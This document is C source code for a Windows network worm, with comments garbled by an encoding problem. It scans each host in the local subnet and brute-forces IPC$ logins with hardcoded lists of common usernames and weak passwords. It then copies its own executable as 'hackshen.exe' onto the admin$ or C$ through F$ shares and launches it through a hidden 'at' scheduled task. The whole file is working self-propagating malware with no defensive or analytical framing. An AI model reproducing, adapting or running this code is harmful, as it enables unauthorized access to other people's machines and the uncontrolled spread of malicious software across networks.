//#include "head.h"
//----------------------------------------------------------------
char *GetMyFilePath();
DWORD SendFiles(const char *RemoteIP,const char *lpUserName,const char *lpPassword);
//----------------------------------------------------------------
typedef DWORD(WINAPI*tWNetAddConnection2)
(
 LPNETRESOURCE lpNetResource,		 // connection details
 LPCTSTR	   lpPassword,           // ����
 LPCTSTR       lpUsername,           // �û���
 DWORD         dwFlags               // ����ѡ��
);
//----------------------------------------------------------------
int InitWSA()
{
	WORD wVersion =0 ;
	int	 errret = -1;
	WSADATA wsaData;
	wVersion = MAKEWORD(2,2);
	errret = WSAStartup(wVersion,&wsaData);
	if( LOBYTE( wsaData.wVersion) != 2 ||
		HIBYTE( wsaData.wVersion) !=2 )
	{
		return 0;
	}
	return 1;
}
int nCount;
int breakipc=0;
//--------------------------------------------------------------------------------------------
DWORD WINAPI IPC(LPVOID lpParameter)  //IPC��������
{
	OutputDebugString("����û���");
	char *szUser[]={                          
		"administrator","test","admin", "guest","alex", "home",
			"love","xp", "user","game", "123","nn","root","������",
			"movie","time", "yeah","money", "xpuser","hack","enter",
			0};
		//Ҫ���������
		char *szPass[]={
			"", 
				"password","111","123456","qwerty","test","abc123", "memory",
				"home", "12345678","love","bbbbbb","xp", "88888","nn","root","caonima",
				"5201314", "1314520","asdfgh","alex", "angel","NULL",
				"123", "asdf","baby","woaini", "movie",
				0};
			//---------------------------------
			if(!InitWSA()) //��ʼ���׽���
				return 0;
			CHAR szHostName[128]={0};   //�����������ı���   
			struct hostent * pHost;	    
			int b;                      //�������i
			SOCKADDR_IN saddr;
			
			if(gethostname(szHostName,128)==0) //��ȡ�����������
			{		 
				pHost = gethostbyname(szHostName); //���ݼ��������ȡIP��ַ����Ϣ
				for(b = 0; pHost!= NULL && pHost->h_addr_list[b]!= NULL; b++ ) 	
				{	
					memset(&saddr,0,sizeof(saddr)); 
					memcpy(&saddr.sin_addr.s_addr, pHost->h_addr_list[b], pHost->h_length);			
					char szIpaddress[128]={0};
					
					
					
					
					
					for(nCount=1;nCount<254;nCount++)  //C��1-254	
					{
						breakipc=0;
						memset(szIpaddress,0,128);
						wsprintf(szIpaddress,               //��ʽ��IP��szIpaddress����
							"%d.%d.%d.%d",
							saddr.sin_addr.S_un.S_un_b.s_b1,
							saddr.sin_addr.S_un.S_un_b.s_b2,
							saddr.sin_addr.S_un.S_un_b.s_b3,
							nCount);
						//printf("%s\n",szIpaddress);
						for(int i = 0;szUser[i]; i++)	   //����ѭ����szUser������0��λ��ѭ���û���
						{
							for (int j=0;szPass[j];j++)			//����ѭ����szPass������0��λ��ѭ������
							{
								Sleep(200);	
								if (breakipc==1)
								{
									break;
								}
								//��ͣ80����
								SendFiles(szIpaddress,szUser[i],szPass[j]); //����Զ������IP�û��������������ֲ
								//printf("%s\n%s\n%s\n",szIpaddress,szUser[i],szPass[j]);
							}			
						} 
					}
					
				}
			}	
			WSACleanup();	
			return 1;
}
//
DWORD SendFiles(const char *RemoteIP,const char *lpUserName,const char *lpPassword)
{
	HMODULE hModuleMpr=LoadLibrary("mpr.dll");   //��������ͨ�ŵ�mpr.dll��̬���ӿ�
	tWNetAddConnection2 connectipc=(tWNetAddConnection2)GetProcAddress(hModuleMpr,"WNetAddConnection2A");
	char sPwd[20]={0};
	memset(sPwd, 0, 20);
	if(!lstrcmp(lpPassword, "NULL"))
		wsprintf(sPwd, "\"%s\"","");
	char szCmdLine[1028]={0};
	char szIpcFilePath[MAX_PATH]={0};
	wsprintf(szCmdLine,"\\\\%s\\ipc$",RemoteIP);
	NETRESOURCE ns;
	ns.dwScope=RESOURCE_GLOBALNET;
	ns.dwType=RESOURCETYPE_ANY; 
	ns.dwDisplayType=RESOURCEDISPLAYTYPE_GENERIC; 
	ns.dwUsage=RESOURCEUSAGE_CONNECTABLE;
	ns.lpLocalName="";
	ns.lpRemoteName=szCmdLine;
	ns.lpProvider=NULL;
	ns.lpComment=NULL;
	BOOL bRet=TRUE;
	DWORD dwRet;
	dwRet=connectipc(&ns,lpPassword,lpUserName,0);
	if (connectipc)
	{
		char *szMyFilePath=GetMyFilePath();
		Sleep(200);
		memset(szCmdLine,0,1028);
		wsprintf(szCmdLine,"\\\\%s\\admin$\\hackshen.exe",RemoteIP);
		lstrcpy(szIpcFilePath,"admin$\\");
		bRet=CopyFile(GetMyFilePath(),szCmdLine,FALSE);
		if(!bRet)
		{
			memset(szCmdLine,0,1028);
			wsprintf(szCmdLine,"\\\\%s\\C$\\hackshen.exe",RemoteIP);
			lstrcpy(szIpcFilePath,"C:\\hackshen.exe");
			bRet=CopyFile(GetMyFilePath(),szCmdLine,FALSE);
			if(!bRet)
			{
				memset(szCmdLine,0,1028);
				wsprintf(szCmdLine,"\\\\%s\\D$\\hackshen.exe",RemoteIP);
				lstrcpy(szIpcFilePath,"D:\\hackshen.exe");
				bRet=CopyFile(GetMyFilePath(),szCmdLine,FALSE);
				
				if(!bRet)
				{
					memset(szCmdLine,0,1028);
					wsprintf(szCmdLine,"\\\\%s\\E$\\hackshen.exe",RemoteIP);
					lstrcpy(szIpcFilePath,"E:\\hackshen.exe");
					bRet=CopyFile(GetMyFilePath(),szCmdLine,FALSE);
					if(!bRet)
					{
						memset(szCmdLine,0,1028);
						wsprintf(szCmdLine,"\\\\%s\\F$\\hackshen.exe",RemoteIP);
						lstrcpy(szIpcFilePath,"F:\\hackshen.exe");
						bRet=CopyFile(GetMyFilePath(),szCmdLine,FALSE);
						return 0;
					}
				}
			}
		}
		if(bRet)
		{
			SYSTEMTIME sYstemTime;
			GetLocalTime(&sYstemTime);
			memset(szCmdLine,0,1028);
			wsprintf(szCmdLine,"at \\\\%s %d:%d %s",RemoteIP,sYstemTime.wHour,sYstemTime.wMinute+2,szIpcFilePath);
			WinExec(szCmdLine,SW_HIDE);
			breakipc=1;
			Sleep(2000);
		}
		return 0;
	}
	return 1;
}
//-----------------------------------------------------------------------------
char *GetMyFilePath()  //�õ�����·������
{
	char szMyFilePath[MAX_PATH]={0};
	GetModuleFileName(NULL,szMyFilePath,MAX_PATH);
	return szMyFilePath;
}
